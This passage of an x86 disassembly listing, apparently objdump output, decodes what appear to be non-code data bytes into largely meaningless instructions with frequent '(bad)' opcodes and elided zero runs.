  420480:	outs   dx,BYTE PTR ds:[esi]
  420481:	cmp    bh,al
  420483:	fcomi  st,st(1)
  420485:	(bad)  
  420486:	out    0x60,eax
  420488:	jo     0x42041f
  42048a:	jle    0x420419
  42048c:	aaa    
  42048d:	sub    DWORD PTR ds:[esi+0x45],edi
	...
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	cdq    
  420501:	sbb    DWORD PTR [eax+0x15870c4],edx
  420507:	add    BYTE PTR ds:0x2d000001,al
  42050d:	leave  
  42050e:	les    esi,FWORD PTR [eax+esi*1-0x3f]
  420512:	in     eax,dx
  420513:	ret    0x246b
  420516:	pop    eax
  420517:	sub    al,0x55
  420519:	and    BYTE PTR [edi+edx*1-0x16],ah
  42051d:	or     edi,edi
  42051f:	pusha  
  420520:	jmp    0x4205a0
  420522:	add    cl,dl
  420524:	and    ebp,ebx
  420526:	xchg   ebx,eax
  420527:	or     esp,DWORD PTR [edx+esi*1]
  42052a:	mov    edx,0x3dbbfdb6
  42052f:	xchg   edi,eax
  420530:	fild   WORD PTR ds:0x2abc8270
  420536:	sahf   
  420537:	xadd   DWORD PTR [esi+ebx*1],ebx
  42053b:	pop    es
  42053c:	inc    ebx
  42053d:	in     al,dx
  42053e:	std    
  42053f:	or     cl,BYTE PTR [edx]
  420541:	mov    DWORD PTR [ebp+0x34],edx
  420544:	inc    ecx
  420545:	push   edx
  420546:	fistp  DWORD PTR [edx+0x51cc3519]
  42054c:	or     eax,0x4df7c429
  420551:	lahf   
  420552:	cmp    al,0x37
  420554:	(bad)  
  420556:	js     0x4205b6
  420558:	push   edi
  420559:	sub    dl,0x58
  42055c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42055d:	(bad)  
  42055e:	mov    ebx,0x917d64f0
  420563:	fadd   st,st(4)
  420565:	in     al,0x26
  420567:	sub    DWORD PTR [ebx+0x41],edx
  42056a:	push   cs
  42056b:	and    al,bl
  42056d:	xor    DWORD PTR [ebp+ebx*2-0xe],esi
  420571:	(bad)  
  420572:	int3   
  420573:	ins    BYTE PTR es:[edi],dx
  420574:	fnstsw WORD PTR [eax-0x63fc314b]
  42057a:	pop    ebx
  42057b:	jl     0x4205d8
  42057d:	sbb    eax,0x3668238
  420582:	enter  0x6b6e,0x97
  420586:	into   
  420587:	push   edi
  420588:	stc    
  420589:	in     eax,0x52
  42058b:	fmul   DWORD PTR [ebx]
  42058d:	push   ebp
  42058e:	in     eax,dx
  42058f:	inc    eax
  420590:	scas   al,BYTE PTR es:[edi]
  420591:	outs   dx,BYTE PTR ds:[esi]
  420592:	cwde   
  420593:	push   ebx
  420594:	in     al,dx
  420595:	push   cs
  420596:	div    BYTE PTR [edx-0xd]
  420599:	mov    dl,0xa1
  42059b:	out    dx,al
  42059c:	push   eax
  42059d:	cmc    
  42059e:	arpl   WORD PTR [esi-0x58],bp
  4205a1:	and    bh,BYTE PTR [esi-0x18bf629a]
  4205a7:	(bad)  
  4205a8:	jl     0x4205e5
  4205aa:	jnp    0x420598
  4205ac:	jbe    0x42054e
  4205ae:	sub    al,0xd6
  4205b0:	and    DWORD PTR [eax+0x2750b894],edx
  4205b6:	mov    bl,0x47
  4205b8:	ss adc eax,esi
  4205bb:	dec    esp
  4205bc:	add    DWORD PTR [edi-0x40],esi
  4205bf:	repnz stos DWORD PTR es:[edi],eax
  4205c1:	call   0x1c3ea5cd
  4205c6:	gs pop esp
  4205c8:	int3   
  4205c9:	fwait
  4205ca:	stos   BYTE PTR es:[edi],al
  4205cb:	jmp    0xe8af:0xd037b5e2
  4205d2:	imul   esi,DWORD PTR [ebp-0x22101550],0x1b
  4205d9:	xor    al,0x77
  4205db:	sub    al,0x12
  4205dd:	push   esp
  4205de:	aas    
  4205df:	scas   eax,DWORD PTR es:[edi]
  4205e0:	scas   al,BYTE PTR es:[edi]
  4205e1:	shr    BYTE PTR [ecx-0x67],cl
  4205e4:	dec    esi
  4205e5:	xchg   edx,edi
  4205e7:	and    edx,DWORD PTR [edi-0x4e08f4f2]
  4205ed:	xor    eax,0xb30e3eaa
  4205f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205f3:	loope  0x420659
  4205f5:	mov    BYTE PTR [ecx-0x31],bl
  4205f8:	fadd   DWORD PTR [edx+0xc]
  4205fb:	out    dx,al
  4205fc:	and    eax,0x7d3b7b89
  420601:	out    0x19,al
  420603:	dec    edi
  420604:	jmp    0x4205de
  420606:	mov    esp,0x76100743
  42060b:	(bad)  
  42060c:	jb     0x420659
  42060e:	push   esp
  42060f:	add    dh,BYTE PTR [eax+eax*1+0x0]
	...
  420672:	add    BYTE PTR [eax],al
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	arpl   WORD PTR [eax],sp
  420682:	out    0xb9,al
  420684:	jne    0x4206df
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0x3c000001
  42068d:	call   0x8ce5:0xd4dffb9
  420694:	mov    ecx,0x2a65e942
  420699:	xlat   BYTE PTR ds:[ebx]
  42069a:	mov    ah,0xfd
  42069c:	stos   DWORD PTR es:[edi],eax
  42069d:	fisubr WORD PTR [edx-0x8]
  4206a0:	gs pop esi
  4206a2:	and    BYTE PTR [ecx-0x4aac3b4a],ah
  4206a8:	jae    0x420716
  4206aa:	mov    edi,0xe75106c0
  4206af:	pop    ebx
  4206b0:	outs   dx,DWORD PTR ds:[esi]
  4206b1:	xchg   BYTE PTR [eax+0xe],cl
  4206b4:	mov    cl,0x1
  4206b6:	ds data16 jle 0x42072f
  4206ba:	in     eax,0xff
  4206bc:	mov    BYTE PTR [eax-0x1c1cb3f8],ah
  4206c2:	les    ebx,FWORD PTR [eax-0x4f]
  4206c5:	js     0x42067b
  4206c7:	dec    ebp
  4206c8:	xchg   ebx,eax
  4206c9:	retf   
  4206ca:	fldcw  WORD PTR [edx+0x33a1550f]
  4206d0:	outs   dx,BYTE PTR ds:[esi]
  4206d1:	cdq    
  4206d2:	xchg   BYTE PTR [eax+0x5d],al
  4206d5:	fst    QWORD PTR [ebx-0x6]
  4206d8:	test   esi,esp
  4206da:	mov    cl,0x22
  4206dc:	xchg   ebp,eax
  4206dd:	dec    ebx
  4206de:	pop    ds
  4206df:	stc    
  4206e0:	xor    al,0xcb
  4206e2:	jno    0x42074c
  4206e4:	nop
  4206e5:	or     al,0x4f
  4206e7:	inc    esp
  4206e8:	jno    0x420761
  4206ea:	push   0xffffff90
  4206ec:	adc    DWORD PTR [eax],esi
  4206ee:	addr16 jne 0x4206ee
  4206f1:	mov    esp,0x56e90500
  4206f6:	cmp    esi,DWORD PTR [eax+0x1e]
  4206f9:	cdq    
  4206fa:	(bad)  
  4206fb:	sub    al,0xe5
  4206fd:	dec    ebp
  4206fe:	outs   dx,DWORD PTR ds:[esi]
  4206ff:	out    0x21,eax
  420701:	mov    eax,ds:0xaa58c90
  420706:	pusha  
  420707:	mov    esp,0xb16c0b5c
  42070c:	and    al,0x26
  42070e:	inc    edx
  42070f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420710:	fbstp  TBYTE PTR [ecx]
  420712:	mov    dl,0x40
  420714:	jb     0x4206e5
  420716:	mov    cl,0xda
  420718:	sbb    DWORD PTR [esp+ebp*2-0x67dab3e3],ecx
  42071f:	push   0x7f26a109
  420724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420726:	adc    eax,0x8a4297b6
  42072b:	fwait
  42072c:	and    edi,DWORD PTR [esi+0x20ce3916]
  420732:	call   0xf4eb:0xb3fcd2a2
  420739:	dec    edx
  42073a:	adc    ecx,DWORD PTR [ecx-0x4bc90fa5]
  420740:	push   esp
  420741:	pop    ds
  420742:	loope  0x420793
  420744:	mov    bh,0xbb
  420746:	mov    ebx,0xab646755
  42074b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42074c:	out    0xe5,eax
  42074e:	test   al,0x68
  420750:	lods   al,BYTE PTR ds:[esi]
  420751:	and    ebp,esi
  420753:	test   eax,0x505d1d1c
  420758:	mov    ebp,0xafd2abca
  42075d:	(bad)  
  42075e:	mov    ds,WORD PTR [ecx+ecx*4+0x29]
  420762:	cmp    cl,BYTE PTR [ebx-0x3a]
  420765:	in     eax,dx
  420766:	ja     0x4207a6
  420768:	(bad)  
  42076a:	mov    dl,0x96
  42076c:	sub    ecx,DWORD PTR [ebp+0x69dcda0e]
  420772:	pop    es
  420773:	push   ebx
  420774:	add    bl,BYTE PTR [edi]
  420776:	jno    0x4207e1
  420778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420779:	adc    eax,esp
  42077b:	adc    al,0x5a
  42077d:	mov    al,ds:0xa6672783
  420782:	push   es
  420783:	mov    edi,0x9d0ff4d4
  420788:	mov    dl,0xe0
  42078a:	or     BYTE PTR [ebp+0x60b5aa67],dl
  420790:	mov    dh,0x0
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	mov    ch,0x51
  420802:	lods   al,BYTE PTR ds:[esi]
  420803:	pushf  
  420804:	jp     0x420860
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0xe8000001
  42080d:	out    dx,al
  42080e:	and    bl,bh
  420810:	lahf   
  420811:	xor    eax,0xa3bbcdf6
  420816:	imul   BYTE PTR [edx-0x731fdb25]
  42081c:	mov    ecx,0x47d3618e
  420821:	mov    bl,0x8c
  420823:	mov    eax,ds:0x97a4129b
  420828:	clc    
  420829:	push   ebx
  42082a:	ins    BYTE PTR es:[edi],dx
  42082b:	pushf  
  42082c:	outs   dx,BYTE PTR ds:[esi]
  42082d:	(bad)  
  42082e:	xor    edx,DWORD PTR [ebp-0x4d]
  420831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420832:	mov    ah,0xa6
  420834:	ret    0xdf0f
  420837:	push   esp
  420838:	jmpw   0x7031
  42083c:	jb     0x420892
  42083e:	xchg   esi,eax
  42083f:	mov    cl,BYTE PTR [esi-0x5b]
  420842:	adc    bh,BYTE PTR [esi+0x49]
  420845:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  420847:	lahf   
  420848:	xor    DWORD PTR [eax+edi*8],edi
  42084b:	stos   DWORD PTR es:[edi],eax
  42084c:	mov    ds:0x4fe119ef,al
  420851:	in     al,0xe8
  420853:	pop    esi
  420854:	mov    ebx,ds
  420856:	sbb    eax,0xa0bb597a
  42085b:	ror    DWORD PTR ds:0x10cafc5c,1
  420861:	jns    0x42083c
  420863:	pop    ebp
  420864:	push   edx
  420865:	aam    0xdb
  420867:	jecxz  0x4208e5
  420869:	fidiv  WORD PTR [ecx]
  42086b:	inc    edi
  42086c:	cmp    eax,0x1068f7b5
  420871:	loop   0x420894
  420873:	ss jl  0x42086c
  420876:	fwait
  420877:	adc    eax,esp
  420879:	jne    0x420849
  42087b:	push   esp
  42087c:	repnz cmp eax,0x2bc4a56
  420882:	jl     0x4208b6
  420884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420885:	and    eax,0x6b3598d7
  42088a:	fsub   QWORD PTR [edi-0x430ab2ca]
  420890:	fstp   QWORD PTR [ebp-0x34]
  420893:	mov    eax,ds:0xf6e90f9f
  420898:	ins    BYTE PTR es:[edi],dx
  420899:	mov    ebx,0x1d2b3915
  42089e:	adc    DWORD PTR [edi],ebp
  4208a0:	mov    edi,0xa65e916b
  4208a5:	or     ah,0x37
  4208a8:	cmp    eax,0xa027d494
  4208ad:	jbe    0x4208c0
  4208af:	popf   
  4208b0:	repnz adc al,0xb2
  4208b3:	mov    esp,0x680c01ec
  4208b8:	fsubr  QWORD PTR [edi+ebx*1]
  4208bb:	mov    al,ds:0xbf0071c
  4208c0:	push   esp
  4208c1:	(bad)  
  4208c2:	push   ebx
  4208c3:	xor    esi,DWORD PTR ds:0xfcf74906
  4208c9:	add    eax,0x4831ceec
  4208ce:	es pop ebx
  4208d0:	(bad)  
  4208d1:	out    dx,eax
  4208d2:	sub    edi,DWORD PTR [edi+0x48]
  4208d5:	xchg   BYTE PTR [eax-0x5079a694],cl
  4208db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208dc:	int    0x33
  4208de:	loope  0x42088d
  4208e0:	push   ecx
  4208e1:	add    ebx,DWORD PTR [edx-0x3627b58b]
  4208e7:	in     eax,0xf3
  4208e9:	jmp    0xefab:0x2f488e81
  4208f0:	or     BYTE PTR [ebp-0x4dd3afe6],bl
  4208f6:	xor    ebx,DWORD PTR [ecx]
  4208f8:	in     al,0x8c
  4208fa:	jl     0x4208e7
  4208fc:	xchg   edx,eax
  4208fd:	retf   0xab8e
  420900:	xor    BYTE PTR [esp+edi*4],0xd4
  420904:	sbb    ebx,DWORD PTR [ecx]
  420906:	dec    eax
  420907:	jae    0x420948
  420909:	repz sar BYTE PTR [ebp-0x28a17323],0xf5
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xb1
  420981:	adc    eax,0x5b7f899a
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0xc5000001
  42098d:	cmc    
  42098e:	outs   dx,BYTE PTR ds:[esi]
  42098f:	push   0xd52561cf
  420994:	nop
  420995:	inc    ecx
  420996:	xchg   ebx,eax
  420997:	add    ebp,eax
  420999:	jae    0x4209f8
  42099b:	adc    edi,DWORD PTR [ebx]
  42099d:	lahf   
  42099e:	jmp    0x2a33b143
  4209a3:	push   ebx
  4209a4:	cmp    eax,0xf22d1f44
  4209a9:	dec    esp
  4209aa:	or     ebx,DWORD PTR [ecx-0x21e5d9b]
  4209b0:	into   
  4209b1:	or     bl,ch
  4209b3:	or     al,0xfc
  4209b5:	jae    0x420967
  4209b7:	mov    ah,0x3b
  4209b9:	arpl   dx,si
  4209bb:	mov    cl,0x59
  4209bd:	test   BYTE PTR [edx],ch
  4209bf:	lds    edx,FWORD PTR [edi+ebx*4+0x553fa7db]
  4209c6:	adc    bh,BYTE PTR [eax+0x10b5d718]
  4209cc:	dec    edi
  4209cd:	pushf  
  4209ce:	add    eax,0xc75920fb
  4209d3:	or     dl,cl
  4209d5:	dec    ecx
  4209d6:	mov    BYTE PTR [esi+0x43],ch
  4209d9:	xor    DWORD PTR [esi-0x12136ee],0xffffffee
  4209e0:	shl    BYTE PTR [edi],0x63
  4209e3:	int    0xe7
  4209e5:	xchg   dl,al
  4209e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209e8:	fxch   st(0)
  4209ea:	std    
  4209eb:	fnsave [edi+0x2864debe]
  4209f1:	call   0x75af:0x43f88d7c
  4209f8:	mov    edx,0xc98b345c
  4209fd:	xor    al,0x7b
  4209ff:	(bad)  
  420a00:	mov    eax,ds:0x81af1d97
  420a05:	mov    ds:0x2f79b27,al
  420a0a:	add    BYTE PTR [edi],bl
  420a0c:	push   ecx
  420a0d:	retf   
  420a0e:	test   al,0x50
  420a10:	pop    ebx
  420a11:	fst    DWORD PTR [edi+0x19728646]
  420a17:	rol    BYTE PTR [ebx+0x180cad5a],0x9c
  420a1e:	and    BYTE PTR [ebx+0x65],bl
  420a21:	call   DWORD PTR [edx]
  420a23:	or     esp,esp
  420a25:	add    ch,ah
  420a27:	cli    
  420a28:	call   0x9c0f6ec
  420a2d:	mov    bh,0xbd
  420a2f:	xor    al,0x17
  420a31:	aad    0x1d
  420a33:	push   edi
  420a34:	jmp    0x420a4e
  420a36:	mov    ah,0x27
  420a38:	std    
  420a39:	xor    cl,BYTE PTR [edx]
  420a3b:	mov    esp,0x77ea8230
  420a40:	adc    al,0xff
  420a42:	outs   dx,DWORD PTR ds:[esi]
  420a43:	(bad)  
  420a44:	aas    
  420a45:	gs inc esi
  420a47:	jae    0x4209e2
  420a49:	add    ebx,DWORD PTR [esi]
  420a4b:	ins    BYTE PTR es:[edi],dx
  420a4c:	mov    al,ds:0xd5ef1288
  420a51:	out    dx,al
  420a52:	pop    edi
  420a53:	iret   
  420a54:	mov    ebp,0xa7838a34
  420a59:	iret   
  420a5a:	xor    al,0xa1
  420a5c:	pop    eax
  420a5d:	retf   0x684e
  420a60:	jmp    0xff7e810d
  420a65:	or     BYTE PTR [edi+0x1a724662],0x4f
  420a6c:	int    0xd
  420a6e:	pop    edx
  420a6f:	dec    eax
  420a70:	sub    eax,DWORD PTR [ebx+0x3c1a0039]
  420a76:	and    eax,0x3c4990d3
  420a7b:	lods   al,BYTE PTR ds:[esi]
  420a7c:	fs xor al,0x52
  420a7f:	ja     0x420ac3
  420a81:	or     eax,0xf30709e8
  420a86:	sub    al,0xbf
  420a88:	(bad)  
  420a89:	hlt    
  420a8a:	push   0xa
  420a8c:	ins    DWORD PTR es:[edi],dx
  420a8d:	scas   al,BYTE PTR es:[edi]
  420a8e:	fiadd  WORD PTR [esi+0x6f]
	...
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b01:	push   edx
  420b02:	popf   
  420b03:	pop    ebp
  420b04:	test   BYTE PTR [ecx+eax*1+0x0],bl
  420b08:	add    eax,0xc3000001
  420b0d:	test   ch,0x45
  420b10:	sub    dh,BYTE PTR [edx]
  420b12:	jne    0x420b5d
  420b14:	and    BYTE PTR [ecx],al
  420b16:	cmp    DWORD PTR [eax-0x37],edx
  420b19:	add    al,0xc5
  420b1b:	std    
  420b1c:	or     bl,BYTE PTR [edx-0x7c47dc87]
  420b22:	ror    DWORD PTR [eax+0xb751b92],0x87
  420b29:	xor    edi,edx
  420b2b:	ins    BYTE PTR es:[edi],dx
  420b2c:	ror    BYTE PTR [eax-0x4d],cl
  420b2f:	add    eax,0xfc1e72a4
  420b34:	dec    ebx
  420b35:	mov    eax,ds:0x72655f2e
  420b3a:	popa   
  420b3b:	dec    eax
  420b3c:	or     DWORD PTR [ebp+0x63],ecx
  420b3f:	cmc    
  420b40:	mov    ch,al
  420b42:	pop    esp
  420b43:	cmp    eax,0xecac022f
  420b48:	mov    dh,0x57
  420b4a:	adc    al,BYTE PTR [ebx]
  420b4c:	jbe    0x420b81
  420b4e:	mov    eax,ds:0x51f5eefd
  420b53:	pop    eax
  420b54:	cwde   
  420b55:	sbb    ebx,DWORD PTR [esi+0x6a]
  420b58:	les    esp,FWORD PTR [edi-0x5f3a579b]
  420b5e:	dec    BYTE PTR [ecx+ebx*2+0x25]
  420b62:	fadd   QWORD PTR [edi-0x75]
  420b65:	leave  
  420b66:	add    DWORD PTR [ecx+0x2e719a96],esi
  420b6c:	pushf  
  420b6d:	sbb    BYTE PTR [edx-0x2d],dh
  420b70:	sbb    DWORD PTR [edi-0x30],ecx
  420b73:	out    0x97,eax
  420b75:	pop    ebx
  420b76:	ret    
  420b77:	jmp    0x95e:0x593da9c6
  420b7e:	dec    ecx
  420b7f:	and    dh,ch
  420b81:	retf   0x5609
  420b84:	jmp    0xb611e8dd
  420b89:	pop    ss
  420b8a:	dec    esi
  420b8b:	jg     0x420bbf
  420b8d:	sar    BYTE PTR [esi],0x5
  420b90:	sbb    esi,DWORD PTR [eax]
  420b92:	repnz mov ah,0x74
  420b95:	sbb    eax,0x3dea4a4c
  420b9a:	dec    eax
  420b9b:	nop
  420b9c:	xor    edi,esi
  420b9e:	ja     0x420bd4
  420ba0:	imul   esp,DWORD PTR [ecx+esi*8+0x73815cf5],0xfd0e3d5c
  420bab:	and    BYTE PTR [ecx-0x7481db43],bh
  420bb1:	jle    0x34d18e81
  420bb7:	in     eax,0x46
  420bb9:	mov    ecx,0x1c0529e6
  420bbe:	push   ebp
  420bbf:	cmp    BYTE PTR [ecx],0xaf
  420bc2:	cmp    dl,BYTE PTR [esi-0x18db4191]
  420bc8:	xlat   BYTE PTR ds:[ebx]
  420bc9:	pop    ebx
  420bca:	push   edx
  420bcb:	push   0xddf1a26a
  420bd0:	mov    bl,0x21
  420bd2:	hlt    
  420bd3:	loopne 0x420b7c
  420bd5:	les    esp,FWORD PTR ds:0x9808ae07
  420bdb:	mov    al,0xab
  420bdd:	es ja  0x420c44
  420be0:	dec    esp
  420be1:	outs   dx,BYTE PTR ds:[esi]
  420be2:	cli    
  420be3:	sysenter 
  420be5:	aad    0x31
  420be7:	mov    al,0xbb
  420be9:	mov    al,ss:0xd12d5ec4
  420bef:	aam    0xa8
  420bf1:	popf   
  420bf2:	inc    esp
  420bf3:	aam    0x56
  420bf5:	push   ebx
  420bf6:	jle    0x420ba2
  420bf8:	fsub   QWORD PTR [edx-0x54]
  420bfb:	fwait
  420bfc:	jg     0x420bc3
  420bfe:	jg     0x420c1d
  420c00:	xchg   ebx,eax
  420c01:	outs   dx,BYTE PTR ds:[esi]
  420c02:	jmp    0x5a69:0xa153fa1
  420c09:	lahf   
  420c0a:	or     ecx,edx
  420c0c:	in     eax,0xda
  420c0e:	scas   eax,DWORD PTR es:[edi]
  420c0f:	dec    esp
  420c10:	sldt   WORD PTR [eax]
	...
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	inc    edi
  420c81:	pop    es
  420c82:	or     ecx,DWORD PTR [ebx+0x15d89]
  420c88:	add    eax,0x6d000001
  420c8d:	shl    BYTE PTR [edi+0x47d05f41],0xb3
  420c94:	ins    BYTE PTR es:[edi],dx
  420c95:	call   0xefa2:0x113e4479
  420c9c:	div    BYTE PTR [ebx+0xe]
  420c9f:	push   ebx
  420ca0:	jecxz  0x420cc7
  420ca2:	dec    esi
  420ca3:	and    cl,BYTE PTR [ecx]
  420ca5:	(bad)  
  420ca6:	ror    BYTE PTR [ebp-0x380be845],0xf
  420cad:	retf   
  420cae:	popa   
  420caf:	retf   0x12f
  420cb2:	cwde   
  420cb3:	push   edi
  420cb4:	pandn  mm4,QWORD PTR [eax+0x1]
  420cb8:	mov    ch,0xbc
  420cba:	repz clc 
  420cbc:	and    ebx,esi
  420cbe:	and    al,0x6b
  420cc0:	push   ebx
  420cc1:	mov    dh,0xc0
  420cc3:	jp     0x420c79
  420cc5:	inc    ebx
  420cc6:	lea    ecx,[edi+0x2e62e10d]
  420ccc:	hlt    
  420ccd:	sbb    cl,BYTE PTR [esi+0x3057e0ba]
  420cd3:	mov    WORD PTR [edx],es
  420cd5:	icebp  
  420cd6:	jb     0x420d55
  420cd8:	ficom  WORD PTR [eax+0x2a]
  420cdb:	int3   
  420cdc:	lods   al,BYTE PTR ds:[esi]
  420cdd:	pop    esi
  420cde:	gs test al,0x25
  420ce1:	xchg   ecx,eax
  420ce2:	dec    ebp
  420ce3:	adc    eax,0xabc43184
  420ce8:	jbe    0x420d30
  420cea:	push   edi
  420ceb:	aas    
  420cec:	hlt    
  420ced:	sbb    eax,0x73b73429
  420cf2:	das    
  420cf3:	in     eax,0x77
  420cf5:	mov    BYTE PTR [eax],bh
  420cf7:	mov    cl,0x16
  420cf9:	and    ch,BYTE PTR [edx]
  420cfb:	retf   
  420cfc:	adc    DWORD PTR [ebx-0x5a1e9f71],eax
  420d02:	test   DWORD PTR [edx],0x1d7c8b21
  420d08:	fist   WORD PTR [edx]
  420d0a:	int3   
  420d0b:	(bad)  
  420d0d:	aam    0x9e
  420d0f:	cli    
  420d10:	and    BYTE PTR [esi-0x24],ah
  420d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d14:	pop    ebx
  420d15:	(bad)  
  420d16:	clc    
  420d17:	fimul  WORD PTR [ebp-0x2505c698]
  420d1d:	or     ebp,DWORD PTR [edi+0x42]
  420d20:	addr16 (bad) 
  420d22:	xor    DWORD PTR ds:0x31be6d7f,edx
  420d28:	int3   
  420d29:	push   cs
  420d2a:	jno    0x420cf0
  420d2c:	nop    DWORD PTR [ebp+ebp*1-0x78]
  420d31:	mov    esi,0x228ecd19
  420d36:	dec    esi
  420d37:	xlat   BYTE PTR ds:[ebx]
  420d38:	test   al,0x58
  420d3a:	jl     0x420d3e
  420d3c:	test   BYTE PTR [esi],ch
  420d3e:	xor    al,0xd2
  420d40:	daa    
  420d41:	fwait
  420d42:	xor    cl,BYTE PTR [ebx-0x12b04a93]
  420d48:	adc    bh,BYTE PTR [esi]
  420d4a:	cwde   
  420d4b:	inc    ecx
  420d4c:	mov    edi,0x813c555f
  420d51:	stos   BYTE PTR es:[edi],al
  420d52:	mov    esi,0x99900ff8
  420d57:	pushf  
  420d58:	fadd   QWORD PTR [esi]
  420d5a:	jb     0x420d62
  420d5c:	(bad)  [ecx+0x3c]
  420d5f:	test   BYTE PTR [esp+ebp*8+0x2c],bl
  420d63:	adc    esp,ecx
  420d65:	or     BYTE PTR [edx],bl
  420d67:	ds out dx,al
  420d69:	xor    WORD PTR [esi-0x62860dce],ax
  420d70:	and    edx,DWORD PTR [edi]
  420d72:	das    
  420d73:	mov    al,ds:0xd8f50e7b
  420d78:	ss int 0xd1
  420d7b:	mov    esi,0x50a7ec9e
  420d80:	cmp    DWORD PTR [ebp-0x25849b41],eax
  420d86:	shl    DWORD PTR [edi],0x7
  420d89:	adc    bl,ah
  420d8b:	sub    DWORD PTR [edi-0x6ed53b8d],eax
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xc656d46e
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0xad000001,al
  420e0d:	ins    BYTE PTR es:[edi],dx
  420e0e:	int3   
  420e0f:	pop    esi
  420e10:	jp     0x420e19
  420e12:	mov    eax,ds:0x5c8dbf9b
  420e17:	enter  0xc289,0x33
  420e1b:	fimul  DWORD PTR [ecx]
  420e1d:	or     DWORD PTR [ebp-0x55],0x5d
  420e21:	gs pusha 
  420e23:	in     al,0xcf
  420e25:	dec    esi
  420e26:	call   0x8446:0xf566ca06
  420e2d:	xor    BYTE PTR [eax],dl
  420e2f:	js     0x420e97
  420e31:	push   ss
  420e32:	sbb    eax,edx
  420e34:	sbb    esi,DWORD PTR [ebx]
  420e36:	jmp    0x8d8a:0xab010b11
  420e3d:	xor    BYTE PTR [esi],bl
  420e3f:	mul    esp
  420e41:	mov    ebx,0x9cf22442
  420e46:	pop    ss
  420e47:	sub    edx,esi
  420e49:	mov    DWORD PTR [eax-0x12a8d912],edi
  420e4f:	sub    ah,BYTE PTR [esp+esi*8-0x614efa06]
  420e56:	loop   0x420e12
  420e58:	mov    al,0x1c
  420e5a:	jne    0x420e52
  420e5c:	pop    ebp
  420e5d:	cmp    esi,DWORD PTR [edx]
  420e5f:	jl     0x420de7
  420e61:	mov    edx,0x418a6350
  420e66:	xor    al,0x3e
  420e68:	rcr    DWORD PTR [edi-0x4311d6f9],1
  420e6e:	cli    
  420e6f:	clc    
  420e70:	xor    eax,0xecdf0c58
  420e75:	or     esp,DWORD PTR [ebp+0x614136f5]
  420e7b:	mov    ah,0x1b
  420e7d:	aam    0xe2
  420e7f:	ret    0x3daa
  420e82:	(bad)  
  420e83:	pop    esi
  420e84:	push   edi
  420e85:	add    al,0xe3
  420e87:	into   
  420e88:	dec    ebx
  420e89:	out    dx,al
  420e8a:	inc    ebp
  420e8b:	jecxz  0x420e37
  420e8d:	xchg   edi,eax
  420e8e:	imul   esi,DWORD PTR [edi],0x16
  420e91:	cmp    ecx,DWORD PTR [edx-0x5f]
  420e94:	cld    
  420e95:	ffree  st(2)
  420e97:	sub    dl,BYTE PTR [edi+0x71]
  420e9a:	or     DWORD PTR [ebp-0x3a42b7ae],ecx
  420ea0:	cmp    al,0xcb
  420ea2:	push   0xffffffed
  420ea4:	sub    eax,edx
  420ea6:	jmp    0x420ee9
  420ea8:	push   ds
  420ea9:	gs add ecx,edi
  420eac:	in     al,dx
  420ead:	mov    bh,0x37
  420eaf:	or     eax,0xbc649438
  420eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eb5:	jo     0x420e81
  420eb7:	jge    0x420ef7
  420eb9:	retf   0xdc4d
  420ebc:	jl     0x420f08
  420ebe:	pop    ecx
  420ebf:	xchg   esp,eax
  420ec0:	inc    ebp
  420ec1:	xchg   ebp,eax
  420ec2:	pop    esp
  420ec3:	(bad)  
  420ec4:	loopne 0x420eec
  420ec6:	ja     0x420e78
  420ec8:	inc    esp
  420ec9:	add    al,0xde
  420ecb:	xor    ax,WORD PTR [edi-0x1]
  420ecf:	push   esp
  420ed0:	aad    0x3d
  420ed2:	daa    
  420ed3:	inc    ebp
  420ed4:	leave  
  420ed5:	aam    0x75
  420ed7:	call   0x77b2:0x79601c65
  420ede:	enter  0x57d2,0xc3
  420ee2:	xlat   BYTE PTR ds:[ebx]
  420ee3:	adc    eax,DWORD PTR [ebp+0x56]
  420ee6:	clc    
  420ee7:	adc    dh,bl
